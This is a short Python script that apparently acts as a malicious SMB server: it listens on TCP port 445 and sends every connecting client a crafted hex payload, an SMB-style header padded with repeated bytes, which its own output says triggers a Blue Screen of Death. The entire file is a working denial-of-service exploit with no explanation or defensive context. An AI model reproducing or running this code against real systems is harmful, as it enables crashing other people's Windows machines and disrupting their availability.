import SocketServer
from binascii import unhexlify
payload = '000000ecfd534d4241414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141'
class byebye(SocketServer.BaseRequestHandler):
        def handle(self):
                try:
                        print ("From:", self.client_address)
                        print ("[*]Sending Payload...")
                        self.request.send(unhexlify(payload))
                except Exception:
                        print("BSoD Triggered on", self.client_address)
                        pass
SocketServer.TCPServer.allow_reuse_address = 1
launch = SocketServer.TCPServer(('', 445),byebye)
launch.serve_forever()
